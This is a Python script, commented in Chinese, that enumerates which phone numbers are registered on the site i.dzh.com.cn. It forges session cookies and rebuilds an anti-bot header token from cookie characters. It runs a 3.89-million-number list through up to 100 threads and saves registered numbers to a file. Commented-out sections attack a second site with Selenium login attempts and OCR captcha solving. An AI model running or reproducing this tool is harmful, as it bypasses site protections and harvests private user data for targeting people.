import json
import random
import threading
import time
import traceback

# import ddddocr
import requests

from moduless.output_utils import print_err, print_inf
from utils.output_utils import print_suc

# from utils.netutils import fixpackage

n = 0
suc = 0
#
# opt = Options()
# # opt.add_argument('--headless')
# cdriver = webdriver.Chrome('chromedriver/chromedriver.exe', options=opt)  # win c driver
# cdriver.implicitly_wait(1)  # wait
# print_inf('selenium启动成功')
# cdriver.get('https://www.yxcps.com/')
# login_btn_xpath = '//*[@id="top_nav_box"]/li[4]/a'
# tel_xpath = '//*[@id="popDiv"]/div[1]/div/div[2]/div[2]/div/ul/li[2]/a'
# verify_code_img_xpath = '//*[@id="imageVCodeId"]'
# verify_code_input_xpath = '//*[@id="imageVCode"]'
# ad_1_xpath = '/html/body/div[7]/div/a'
# ad_2_xpath = '//*[@id="tancsrc"]/div[1]/div/a[1]'
#
# cdriver.find_element(By.XPATH, ad_1_xpath).click()
# cdriver.find_element(By.XPATH, ad_2_xpath).click()
# print_inf('关闭广告成功')
#
# cdriver.find_element(By.XPATH, login_btn_xpath).click()  # 点击登录按钮
# cdriver.find_element(By.XPATH, tel_xpath).click()  # 点击手机密码登录按钮
#
# tel_input_xpath = '//*[@id="accountNo"]'
# pwd_input_xpath = '//*[@id="pswd"]'
# info_bar_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[1]/span'
# submit_btn_xpath = '//*[@id="fastAjaxLoginForm"]/div/div/div[6]/a'
threads = 0


# d = ddddocr.DdddOcr()

class tel:

    def generate_random_str(self, randomlength=8):
        """
        生成一个指定长度的随机字符串
        """
        random_str = ''
        base_str = '0123456789'
        length = len(base_str) - 1
        for i in range(randomlength):
            random_str += base_str[random.randint(0, length)]

        return random_str

    #
    # while True:
    #     random_tel = '139' + generate_random_str()
    #     tel_input = cdriver.find_element(By.XPATH, tel_input_xpath)
    #     pwd_input = cdriver.find_element(By.XPATH, pwd_input_xpath)
    #     submit_btn = cdriver.find_element(By.XPATH, submit_btn_xpath)
    #     info_bar = cdriver.find_element(By.XPATH, info_bar_xpath)
    #     try:
    #         verify_code_input = cdriver.find_element(By.XPATH, verify_code_input_xpath)
    #         verify_code = cdriver.find_element(By.XPATH, verify_code_img_xpath).screenshot_as_png
    #         ocr = ddddocr.DdddOcr()
    #         ocr_res = ocr.classification(verify_code)  # 识别验证码
    #         input_element(pwd_input_xpath, 'alsdkjfs13')  # 输入一定不正确的密码(大概率)
    #         input_element(tel_input_xpath, random_tel)  # 输入随机的电话号码
    #         input_element(verify_code_input_xpath, ocr_res)  # 输入验证码
    #         print_inf('%s:%s:%s' % (random_tel, ocr_res, info_bar.text))  # text验证
    #         submit_btn.click()
    #
    #     except Exception:
    #         print_err('没找到验证码输入框')
    #         # traceback.print_exc()
    #         # time.sleep(5)
    #         # cdriver.implicitly_wait(100)
    #         input_element(tel_input_xpath,'13940273817')# 弄出验证码框
    #         input_element(pwd_input_xpath,'asldlfhawe')
    #         submit_btn.click()
    JSESSIONID = '7F2A5FB27919%s' % generate_random_str(20)

    cookie = {'JSESSIONID': JSESSIONID}
    headers = {'Accept': 'application/json, text/javascript, */*; q=0.01',
               'referer': 'https://i.dzh.com.cn/UserCenter/page/account/forgetPass?source=2&redirect_uri=https%3A%2F'
                          '%2Fpay.dzh.com.cn%2Fpay-mall%2FuserCenterReturn',
               'X-Requested-Type': '4258e8e80',
               '_umdata': 'GAE6CB15BC821438E93D7FB26B3632D5AE12B95'}

    def getCookie(self):
        res = requests.get('http://i.dzh.com.cn/UserCenter/account/mobile/test?_=%s' % int(time.time()),
                           cookies=self.cookie)
        if len(res.headers) > 0:
            setcook = res.headers['Set-Cookie']
            setcook = setcook.replace(',', ';')
            setcook = setcook.replace(' ', '')
            # print(setcook)
            if len(setcook) > 0:
                for it in setcook.split(';'):
                    res_s = it.split('=')
                    if len(res_s) > 1:
                        self.cookie[res_s[0]] = res_s[1]
        return res

    # 开启验证码识别模块

    # def get_verify_code(self):
    #     url = 'https://www.yxcps.com/vcode2/imageVCode?t=%s' % int(time.time())
    #     res = requests.get(url, cookies=self.cookie)
    #     n = d.classification(res.content)
    #     return n

    # def send_verify_package(self, phone: str):
    #     headers_add = self.getcsrftoken()
    #     headers = {
    #         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    #         'Ctoken': '',
    #         'X-Requested-With': 'XMLHttpRequest',
    #         'Csrftoken': headers_add,
    #         'Accept': '*/*',
    #         'Connection': 'close'
    #     }
    #     data = {
    #         'agree': 1,
    #         'autoLoginFlag': 1,
    #         'checkImageVCode': 0,
    #         'accountNo': phone,
    #         'imageVCode': '',
    #         'pswd': 'ls82hhd92j',
    #         'checkbox': 'checkbox',
    #     }
    #     r = requests.post('http://www.yxcps.com/account/axlogin2.do', headers=headers, cookies=self.cookie,
    #                       data=data).text
    #     return r

    threads = 0

    def doonce(self, tel):
        global n, suc, threads
        threads += 1

        n += 1
        while True:
            # print('1')
            try:
                self.getCookie()
                # print(self.cookie)
                _gpd = self.cookie.get('_gpd')
                _cis = self.cookie.get('_cis')
                _sad = self.cookie.get('_sad')
                oauth = _gpd[-2] + _gpd[3] + _gpd[6] + _cis[-10] + _cis[2] + _cis[11] + _sad[2] + _sad[-10] + \
                        _sad[-1]
                self.headers['X-Requested-Type'] = oauth
                response = requests.get(
                    url='https://i.dzh.com.cn/UserCenter/account/mobile/%s?_=%s' % (tel, int(round(time.time() * 1000))),
                    cookies=self.cookie, headers=self.headers,verify=False)
                # print(self.headers)
                # print(self.cookie)
                # print(response.url)
                # print(response.text)
                message = json.loads(response.text)['message']
                if message is None:
                    print_inf('%s没被注册过 正确率%.2f 发包次数%s' % (tel, (suc / n) * 100, n))
                    break
                elif '你的IP被拒绝服务' in message:
                    print_err('ip被封禁24h')
                else:
                    suc += 1
                    a = open('tel_dzh.txt', 'a')
                    a.write(tel)
                    a.close()
                    print_suc('%s被注册过 正确率%.2f 发包次数%s' % (tel, (suc / n) * 100, n))
                    break
            except Exception:
                # traceback.print_exc()
                pass
            threads -= 1
# while True:
#     try:
#         msg = json.loads(self.send_verify_package(random_tel))['msg']
#         self.cookie = {'JSESSIONID': self.JSESSIONID}
#         # print(msg)
#         if '用户名或密码错误' in msg or '还未设置密码' in msg:
#             w = open('tel.res', 'a')
#             suc += 1
#             print_suc('已注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
#             w.write(random_tel + '\n')
#             w.close()
#             break
#         elif '未注册' in msg:
#             # n += 1
#             # print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
#             break
#         else:
#             print(msg)
#     except:
#         pass


if __name__ == '__main__':
    lines = 0
    for it in open('dic/库小_3890000.txt', 'r').readlines():
        lines += 1
        if lines >= 0:
            # while True:
            # it = fixpackage(it)
            # a = tel()
            # try:
            #     a.doonce(it)
            # except Exception:
            #     pass
            while True:
                if threads <= 100:
                    threading.Thread(target=tel().doonce, args=(it,)).start()
                    break
                else:
                    pass
    # # 一个ip十次机会
    # for i in range(1, 20):
    #     tel().doonce('139%s' % tel().generate_random_str(8))
